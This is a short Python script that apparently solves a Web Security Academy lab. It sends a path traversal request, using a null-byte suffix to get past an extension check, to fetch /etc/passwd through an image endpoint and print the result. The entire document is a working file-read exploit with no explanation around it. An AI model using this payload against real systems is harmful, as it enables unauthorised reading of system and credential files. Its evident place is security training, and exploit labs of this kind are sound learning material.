import requests

s = requests.session()
site = 'acd81f591fd56934808c017d00b500e7.web-security-academy.net'

url = f'''https://{site}/image?filename=../../../etc/passwd%00.png'''
print(f'Trying URL:\n{url}\n\n')
resp = s.get(url)
print(resp.text)